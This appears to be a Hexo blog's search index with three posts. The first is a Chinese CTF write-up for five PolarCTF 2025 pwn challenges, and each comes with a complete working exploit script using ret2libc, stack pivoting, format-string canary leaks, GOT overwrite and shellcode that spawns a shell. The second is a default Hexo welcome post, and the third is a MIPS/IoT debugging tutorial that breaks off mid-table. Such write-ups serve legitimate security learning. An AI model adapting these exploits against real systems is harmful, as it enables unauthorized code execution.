<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PolarCTF2025春季个人挑战赛——部分WP</title>
    <url>/posts/42e0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这是polarctf2025春季个人挑战赛——栈溢出部分，堆系列有两道搞不懂，先放出来这些，后面继续学堆去咯~</p>
<blockquote>
<p>题目附件：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2t1YmFuc2VjL3B3bi90cmVlL21haW4vcG9sYXJjdGYyMDI1X1NwcmluZw==">https://github.com/kubansec/pwn/tree/main/polarctf2025_Spring<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<span id="more"></span>

<h1 id="koi"><a href="#koi" class="headerlink" title="koi"></a>koi</h1><p>知识点：</p>
<ul>
<li>ret2read</li>
<li>ret2libc</li>
</ul>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，64位小端，只开了NX保护：</p>
<p><img src="/./images/p9/image.png"></p>
<p>IDA中打开</p>
<p><img src="/./images/p9/image-2.png"></p>
<p>switch()只会进行一次，所以不用想肯定是利用存在栈溢出的这个wrshell()函数，注意wrshell()中read只能溢出一个字长，也就是只能覆盖rbp。</p>
<p>看到if判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( v4 == 520 &amp;&amp; n == 520 )</span><br><span class="line"> &#123;</span><br><span class="line">   puts(&quot;GOOD&quot;);</span><br><span class="line">   xxx();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>我们要进入这个xxx()函数，得满足<code>v4 == 520 &amp;&amp; n == 520</code>这个条件，v4是我们输入的，我们需要再修改n的值为520，由于只有一次scanf的机会，所以想到在scanf的时候，同时给v4和n读入520。<br>观察scanf前的处理</p>
<p><img src="/./images/p9/image-6.png"></p>
<p>var_4是<code>地址-4</code>，<code>call scanf</code>前将rbp-4的地址赋给rax，作为scanf拟写入的参数，而rbp是我们可以随意覆盖的。<br>由于我们想要修改的变量n的地址在<code>0x60108C</code>，所以将rbp覆盖为<code>0x60108C+4</code>。</p>
<p><img src="/./images/p9/image-3.png"></p>
<p>这样一来scanf读入v4的值的同时，n也会写入同样的值。<br><em>这种攻击手法称为栈迁移中return2read攻击</em></p>
<p>接着顺利进入<code>xxx()</code>：</p>
<p><img src="/./images/p9/image-7.png"></p>
<p>有0x100的溢出空间，常规泄露地址打ret2libc即可。</p>
<p>这里泄露puts和read的地址，在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到对应的libc直接打就行</p>
<p><img src="/./images/p9/image-8.png"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./koi&quot;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span><br><span class="line">n_addr = 0x60108c</span><br><span class="line">xxx_addr = 0x4009CE</span><br><span class="line">rdi = 0x400a63</span><br><span class="line">ret = 0x4005d9</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">payload = cyclic(0x50) + p64(n_addr + 0x4)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;520&#x27;)</span><br><span class="line"></span><br><span class="line"># 泄露puts</span><br><span class="line">io.recv() </span><br><span class="line">elf = ELF(&#x27;./koi&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">puts_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 泄露read</span><br><span class="line">io.recv()</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(0x50+8) +p64(rdi) + p64(read_got) + p64(puts_plt) + p64(xxx_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x80e50</span><br><span class="line">system_addr = libc_base + 0x50d70</span><br><span class="line">binsh_addr = libc_base + 0x1d8678</span><br><span class="line">payload = cyclic(0x50+8) + p64(rdi) + p64(binsh_addr) + p64(ret) +  p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="bllhl-mom"><a href="#bllhl-mom" class="headerlink" title="bllhl_mom"></a>bllhl_mom</h1><p>知识点：</p>
<ul>
<li>格式化字符串漏洞泄露canary</li>
<li>栈迁移</li>
</ul>
<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先checksec看一下<br><img src="/./images/p9/image-9.png"><br>32位小端，开启了canary和NX保护.</p>
<p>IDA中看到，漏洞函数mom()确实存在canary，并且这个canary位于<code>ebp-0xc</code>的位置</p>
<p><img src="/./images/p9/image-11.png"></p>
<p>mom()中有三次read，均存在漏洞:</p>
<p><img src="/./images/p9/image-10.png"></p>
<p>第一个read只能输5字节，存在格式化字符串漏洞，可以泄露栈上信息，那么就用他来泄露canary，调试中算一下偏移是<code>%23$p</code>;</p>
<p><img src="/./images/p9/image-12.png"></p>
<p>第二个和第三个read均可以溢出2个字长，因为溢出字节很少，只能栈迁移到栈上.<br>那么第二个read就是用来泄露ebp的值，第三个read用来栈迁移。</p>
<blockquote>
<p>跟<code>ciscn_2019_es_2</code>这道题有点像，感兴趣可以去读我的这篇文章<a href="https://kubansec.github.io/posts/6e43/?highlight=%E6%A0%88%E8%BF%81%E7%A7%BB">栈迁移学习总结</a></p>
</blockquote>
<p>因为程序中有system，但没有<code>/bin/sh</code>，所以需要在栈中部署<code>/bin/sh</code>，最终布置的栈结构和栈帧的变化如图所示：</p>
<p><img src="/./images/p9/image-13.png"></p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./bllhl_mom&#x27;)</span><br><span class="line">elf = ELF(&#x27;./bllhl_mom&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">io.recv()</span><br><span class="line">io.send(b&#x27;%23$p&#x27;)</span><br><span class="line">canary = int(io.recv(10),16)</span><br><span class="line">print(hex(canary))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">io.send(cyclic(0x50))</span><br><span class="line">io.recvuntil(b&#x27;taaa&#x27;)</span><br><span class="line">ebp = u32(io.recv(4))</span><br><span class="line">print(hex(ebp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">leave_ret = 0x0804861f</span><br><span class="line">system_addr = 0x08048490</span><br><span class="line">binsh_addr = ebp - 0x50</span><br><span class="line">canary_addr = ebp - 0xc</span><br><span class="line">payload = b&#x27;AAAA&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x44,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload = payload.ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(ebp-0x60) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><p>知识点：</p>
<ul>
<li>ret2libc</li>
</ul>
<h2 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec看一下，32位程序，只开了NX保护<br><img src="/./images/p9/image-14.png"></p>
<p>IDA 里面看到是一个非常简单的栈溢出<br><img src="/./images/p9/image-15.png"></p>
<p>那么直接泄露地址，打ret2libc就可以了。可以多泄露几个函数，交叉查询就不用一个一个去尝试了</p>
<p>在<span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">https://libc.blukat.me/<i class="fa fa-external-link-alt"></i></span>找到libc<br><img src="/./images/p9/image-18.png"></p>
<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./libc&#x27;)</span><br><span class="line">elf = ELF(&#x27;libc&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">jiu_addr = 0x08048561</span><br><span class="line"></span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(puts_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">puts_addr = u32(io.recv(4))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">payload = cyclic(58+4) + p32(puts_plt) + p32(jiu_addr) + p32(read_got)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(b&#x27;like\n&#x27;)</span><br><span class="line">read_addr = u32(io.recv(4))</span><br><span class="line">print(hex(read_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - 0x0732a0</span><br><span class="line">sys_addr = libc_base +  0x048170</span><br><span class="line">binsh_addr = libc_base + 0x1bd0d5</span><br><span class="line">payload = cyclic(58+4) + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="fmt-text"><a href="#fmt-text" class="headerlink" title="fmt_text"></a>fmt_text</h1><p>知识点：</p>
<ul>
<li>格式化字符串漏洞</li>
<li>劫持got表</li>
</ul>
<h2 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，32位，开启canary和NX保护，<code>RELRO:      Partial RELRO</code>代表got表可写<br><img src="/./images/p9/image-20.png"></p>
<p>IDA里面分析：</p>
<p><img src="/./images/p9/image-21.png"></p>
<p>yichu函数存在两次格式化字符串漏洞</p>
<p>测一下偏移，偏移为6：</p>
<p><img src="/./images/p9/image-23.png"></p>
<p>并且存在system函数:<br><img src="/./images/p9/image-22.png"></p>
<p>那么思路就是利用第一次格式化字符串漏洞将printf的got表指针指向system函数，第二次发送<code>/bin/sh</code>构造<code>printf(&#39;/bin/sh&#39;)</code>，程序就会执行<code>system(&#39;/bin/sh&#39;)</code>了</p>
<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;./fmt_text&#x27;)</span><br><span class="line">elf = ELF(&#x27;fmt_text&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_plt&#125;) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="bllbl-shellcode-2"><a href="#bllbl-shellcode-2" class="headerlink" title="bllbl_shellcode_2"></a>bllbl_shellcode_2</h1><p>知识点：</p>
<ul>
<li>ret2shellcode</li>
</ul>
<h2 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，64位，保护全关，既然NX保护是关的，意味着可以用ret2shellcode打。<br><img src="/./images/p9/image-25.png"></p>
<p>IDA里面看到yichu函数发生溢出，并且直接把写入的地址给我们了。</p>
<p><img src="/./images/p9/image-26.png"></p>
<p>还给了我们<code>jsp rsp</code>指令</p>
<p><img src="/./images/p9/image-29.png"></p>
<p>那么思路就是将shellode写到栈上去，利用<code>jsp rsp</code>指令跳转到shellcode写入地址，执行shellcode即可。</p>
<p>这里再讲一下偏移，下断点到read处，输入<code>aaaaaaaa</code>：</p>
<p><img src="/./images/p9/image-24.png"></p>
<p>看到他是从<code>rsi-3</code>的位置开始写入的，那么写入<code>13个字节 ( = 16 - 3)</code>就能覆盖到返回地址。</p>
<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;bllbl_shellcode_2&#x27;)</span><br><span class="line"></span><br><span class="line">jmp_rsp = 0x401380</span><br><span class="line">binsh_addr = 0x402047</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">buf_addr = int(io.recv(12),16)</span><br><span class="line">success(&#x27;buf_addr = &gt;&gt;&gt; 0x%x&#x27; % buf_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&quot;&quot;&quot;</span><br><span class="line">mov al,0x3b;</span><br><span class="line">mov esi,edi</span><br><span class="line">mov edi,0x402047</span><br><span class="line">mov edx,esi</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(&quot;&quot;&quot;</span><br><span class="line">sub rsp,21;   # 13+8</span><br><span class="line">jmp rsp</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, &#x27;b *0x401376&#x27;)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzI1MDJfOTEyNjkyMTYvYXJ0aWNsZS9kZXRhaWxzLzE0NjQ1MzU2NA==">https://blog.csdn.net/2502_91269216/article/details/146453564<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW0zWG5ZNkVBNQ==">https://www.bilibili.com/video/BV1m3XnY6EA5<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>PolarCTF</tag>
        <tag>koi</tag>
        <tag>bllhl_mom</tag>
        <tag>bllbl_shellcode_2</tag>
        <tag>libc</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/posts/3eeb/</url>
    <content><![CDATA[<p>Welcome to <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvLw==">Hexo<i class="fa fa-external-link-alt"></i></span>! This is your very first post. Check <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv">documentation<i class="fa fa-external-link-alt"></i></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=">troubleshooting<i class="fa fa-external-link-alt"></i></span> or you can ask me on <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==">GitHub<i class="fa fa-external-link-alt"></i></span>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s">Writing<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=">Server<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s">Generating<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s">Deployment<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
  </entry>
  <entry>
    <title>【IOT安全】MIPS架构初探</title>
    <url>/posts/7f21/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>堆的内容有点多，在实际上比如固件安全分析、物联网漏洞挖掘上对堆的需求似乎并没有那么高，从学校出来还是去搞iot，遂从现在开始学习IOT安全。<br>总体上来看，mips虽然比x86复杂，但因为有x86的铺垫，学起来简单，基本调试一遍就没问题，遇到问题那么多调试几遍即可。</p>
<span id="more"></span>

<h1 id="MIPS交叉编译环境配置"><a href="#MIPS交叉编译环境配置" class="headerlink" title="MIPS交叉编译环境配置"></a>MIPS交叉编译环境配置</h1><p>通过下面的.sh脚本一键安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line"># Qemu</span><br><span class="line">sudo apt install qemu-user-static # 允许直接运行其他架构的静态编译二进制文件（如MIPS程序）</span><br><span class="line">sudo apt install qemu-system-mips # 完整模拟MIPS架构</span><br><span class="line">sudo apt install binfmt-support   # 自动识别非本地架构的可执行文件格式，需配合QEMU使用</span><br><span class="line"></span><br><span class="line"># gdb-multiarch</span><br><span class="line">sudo apt install gdb-multiarch    # 支持多架构的GDB调试器，可调试MIPS/ARM等非x86程序</span><br><span class="line"></span><br><span class="line"># MIPS依赖</span><br><span class="line">sudo apt-get install gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mips64-linux-gnuabi64</span><br><span class="line">sudo apt-get install gcc-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure>

<h1 id="调试第一个MIPS程序"><a href="#调试第一个MIPS程序" class="headerlink" title="调试第一个MIPS程序"></a>调试第一个MIPS程序</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>预编译的c程序：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int mySum(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">    int value=a+b;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int result=mySum(1,2);</span><br><span class="line">    printf(&quot;%d\n&quot;,result);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="静态编译"><a href="#静态编译" class="headerlink" title="静态编译"></a>静态编译</h2><p>MIPS跟x86架构一样，MIPS程序也有32位、64位、大端序和小端序的区分，编译不同文件所需的命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 32位小端序程序</span><br><span class="line">mipsel-linux-gnu-gcc demo.c -o demo_32_little -static -g</span><br><span class="line"># 64位小端序程序</span><br><span class="line">mips64el-linux-gnuabi64-gcc demo.c -o demo_64_little -static -g</span><br><span class="line"># 32位大端序程序</span><br><span class="line">mips-linux-gnu-gcc demo.c -o demo_32_big -static -g</span><br><span class="line"># 64位大端序程序</span><br><span class="line">mips64-linux-gnuabi64-gcc demo.c -o demo_64_big -static -g</span><br></pre></td></tr></table></figure>
<p>用file和readelf验证编译的MIPS程序<br><img src="/./images/p8/image.png"></p>
<h2 id="静态编译的运行"><a href="#静态编译的运行" class="headerlink" title="静态编译的运行"></a>静态编译的运行</h2><p>使用<code>qemu-xxxx-static</code> 模拟运行对应的文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static ./demo_32_little</span><br><span class="line">qemu-mips-static ./demo_32_big </span><br><span class="line">qemu-mips64el-static ./demo_64_little</span><br><span class="line">qemu-mips64-static ./demo_64_big</span><br></pre></td></tr></table></figure>
<p><img src="/./images/p8/image-1.png"></p>
<h2 id="动态编译"><a href="#动态编译" class="headerlink" title="动态编译"></a>动态编译</h2><p>去掉 <code>-static</code> 参数就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 32位小端序程序</span><br><span class="line">mipsel-linux-gnu-gcc demo.c -o demo_32_little_dy -g</span><br><span class="line"># 64位小端序程序</span><br><span class="line">mips64el-linux-gnuabi64-gcc demo.c -o demo_64_little_dy -g</span><br><span class="line"># 32位大端序程序</span><br><span class="line">mips-linux-gnu-gcc demo.c -o demo_32_big_dy -g</span><br><span class="line"># 64位大端序程序</span><br><span class="line">mips64-linux-gnuabi64-gcc demo.c -o demo_64_big_dy -g</span><br></pre></td></tr></table></figure>
<p>同样可以用file和readelf命令查看文件详情，这里就看一下32位小端的<br><img src="/./images/p8/image-5.png"></p>
<h2 id="动态编译运行"><a href="#动态编译运行" class="headerlink" title="动态编译运行"></a>动态编译运行</h2><p>动态编译的程序需要指定动态链接库。在ubuntu中，mips的动态依赖库安装在了<code>/usr/</code>目录中<br><img src="/./images/p8/image-2.png"></p>
<p>如果不在用find命令找一个这个文件夹，比如<br><img src="/./images/p8/image-3.png"></p>
<p>找到动态链接库后，加上参数 <code>-L /usr/mipsel-linux-gnu</code> 就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel-static -L /usr/mipsel-linux-gnu ./demo_32_little_dy</span><br><span class="line">qemu-mips-static -L /usr/mips-linux-gnuabi64 ./demo_32_big _dy</span><br><span class="line">qemu-mips64el-static -L /usr/mips64el-linux-gnu ./demo_64_little_dy</span><br><span class="line">qemu-mips64-static -L /usr/mips64-linux-gnuabi64 ./demo_64_big_dy</span><br></pre></td></tr></table></figure>
<p>以动态链接的32位小端为例<br><img src="/./images/p8/image-4.png"></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>以demo_32_little为例，首先命令行输入 <code>qemu-mipsel -g 2234 ./demo_32_little</code> 在2234端口运行。<br><img src="/./images/p8/image-6.png"></p>
<p>再打开另一个命令行，打开 <code>gdb-multiarch</code> 调试工具，依次输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set architecture mips     #设为mips架构</span><br><span class="line">set endian little         #设置大小端 #大端程序设为big</span><br><span class="line">target remote localhost:2234  </span><br></pre></td></tr></table></figure>
<p><img src="/./images/p8/image-8.png"></p>
<p>成功进入调试界面。<br><img src="/./images/p8/image-9.png"></p>
<h1 id="32位MIPS架构入门"><a href="#32位MIPS架构入门" class="headerlink" title="32位MIPS架构入门"></a>32位MIPS架构入门</h1><h2 id="MIPS寄存器"><a href="#MIPS寄存器" class="headerlink" title="MIPS寄存器"></a>MIPS寄存器</h2><p>在调试界面输入 <code>info registers</code> 查看该程序中的寄存器<br><img src="/./images/p8/image-11.png"><br>比x86多很多，我们分为两类，一类是通用寄存器（黄色部分），一类是特殊寄存器</p>
<h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><table>
<thead>
<tr>
<th align="center">寄存器编号</th>
<th align="left">寄存器名称</th>
<th align="left">全称</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$0</td>
<td align="left">zero</td>
<td align="left">常量寄存器(Constant Value 0)</td>
<td align="left">常数值，永远为0</td>
</tr>
<tr>
<td align="center">$1</td>
<td align="left">$at</td>
<td align="left">汇编临时寄存器（Assembly Temporary）</td>
<td align="left">用于处理在16位以上的大常数时使用</td>
</tr>
<tr>
<td align="center">$2 ~ $3</td>
<td align="left">$v0 ~ $v1</td>
<td align="left">value</td>
<td align="left">用于存储函数或者函数返回的值</td>
</tr>
<tr>
<td align="center">$4 ~ $7</td>
<td align="left">$a0 ~ $a3</td>
<td align="left">Arguments</td>
<td align="left">存放函数调用时的参数</td>
</tr>
<tr>
<td align="center">$8 ~ $15</td>
<td align="left">$t0 ~ $t7</td>
<td align="left">Temporary variable</td>
<td align="left">存放临时变量</td>
</tr>
<tr>
<td align="center">$16 ~ $23</td>
<td align="left">$s0 ~ $s7</td>
<td align="left">保存寄存器（saved）</td>
<td align="left">函数调用和返回时需要保存寄存器的值</td>
</tr>
<tr>
<td align="center">$24 ~ $25</td>
<td align="left">$t8 ~ $t9</td>
<td align="left">Temporary variable</td>
<td align="left">存放临时变量</td>
</tr>
<tr>
<td align="center">$26 ~ $27</td>
<td align="left">$k0 ~ $k1</td>
<td align="left">Keep</td>
<td align="left">保存异常处理和中断的返回值</td>
</tr>
<tr>
<td align="center">$28</td>
<td align="left">$gp</td>
<td align="left">全局指针（Global Pointer）</td>
<td align="left">略</td>
</tr>
<tr>
<td align="center">$29</td>
<td align="left">$sp</td>
<td align="left">堆栈指针（Stack Pointer）</td>
<td align="left">指向栈顶</td>
</tr>
<tr>
<td align="center">$30</td>
<td align="left">$fp或$s8</td>
<td align="left">栈帧指针（Frame Pointer）<br>或有时候会作用第九个saved寄存器</td>
<td align="left">一般我们把它看作<code>$fp</code>，但有时候他也会作为<code>$s8</code>，比如“实例分析：demo_32_little”中的这条汇编指令<code>sw $fp,0x20($sp)</code></td>
</tr>
<tr>
<td align="center">$31</td>
<td align="left">$ra</td>
<td align="left">Return Address</td>
<td align="left">保存函数的返回地址</td>
</tr>
</tbody></table>
<h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><p>这里先介绍三个：$lo、$hi和$pc</p>
<table>
<thead>
<tr>
<th align="center">寄存器名称</th>
<th align="left">全称</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$pc</td>
<td align="left">程序计数器（Program Counter</td>
<td align="left">下一条要执行的指令的地址（类似6中的eip）</td>
</tr>
<tr>
<td align="center">$hi</td>
<td align="left">高 32 位寄存器（High register）</td>
<td align="left">用于乘法（mult、multu）和除法（div、divu）运算。乘法运算时,$hi保存结果的高 32 位；除法运算时，$hi 保存余数。</td>
</tr>
<tr>
<td align="center">$lo</td>
<td align="left">低 32 位寄存器（Low register）</td>
<td align="left">用于乘法（mult、multu）和除法（div、divu）运算。乘法运算时，$lo 保存结果的低 32 位；除法运算时，$lo 保存商。</td>
</tr>
</tbody></table>
<h2 id="MIPS汇编指令"><a href="#MIPS汇编指令" class="headerlink" title="MIPS汇编指令"></a>MIPS汇编指令</h2><table>
<thead>
<tr>
<th align="center">指令</th>
<th>功能描述</th>
<th>例子</th>
<th>执行后结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>move</code></td>
<td>将一个寄存器的值复制到另一个寄存器。</td>
<td><code>move $t0, $t1</code></td>
<td><code>$t0 = $t1</code></td>
</tr>
<tr>
<td align="center"><code>li</code></td>
<td>将立即数加载到寄存器中。</td>
<td><code>li $a0, 0x10</code></td>
<td><code>$a0 = 0x10</code></td>
</tr>
<tr>
<td align="center"><code>lui</code></td>
<td>将立即数加载到寄存器的高16位。</td>
<td><code>lui $s0, 0x1234</code></td>
<td><code>$s0 = 0x12340000</code></td>
</tr>
<tr>
<td align="center"><code>la</code></td>
<td>将地址加载到寄存器中。</td>
<td><code>la $t0, label</code></td>
<td><code>$t0</code> 存储 <code>label</code> 的地址。</td>
</tr>
<tr>
<td align="center"><code>lw</code></td>
<td>从内存中加载一个字到寄存器。</td>
